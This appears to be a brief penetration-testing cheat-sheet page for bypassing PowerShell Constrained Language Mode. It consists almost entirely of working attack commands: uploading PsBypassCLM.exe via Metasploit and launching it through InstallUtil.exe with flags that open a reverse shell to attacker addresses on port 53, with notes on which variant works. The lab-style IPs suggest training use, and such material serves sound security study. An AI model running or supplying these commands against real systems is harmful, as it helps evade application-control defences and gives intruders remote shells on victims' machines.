# PowerShell CLM Bypass

{% code overflow="wrap" %}
```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# Upload Bypass using Metasploit
upload /home/kali/share/PsBypassCLM.exe C:\\Users\\Ted\\PsBypassCLM.exe
# Run this in CMD prompt context is meant to be for a reverse shell but it opens a PowerShell prompt with Full Language mode. 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=192.168.49.57 /rport=53 /U C:\Users\Ted\PsBypassCLM.exe

# This one works
# Upload using Metasploit
upload /home/kali/share/PsBypassCLM.exe C:\\Temp\\PsBypassCLM.exe
# Open shell in current session
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=192.168.49.100 /rport=53 /U C:\temp\PsBypassCLM.exe
```
{% endcode %}
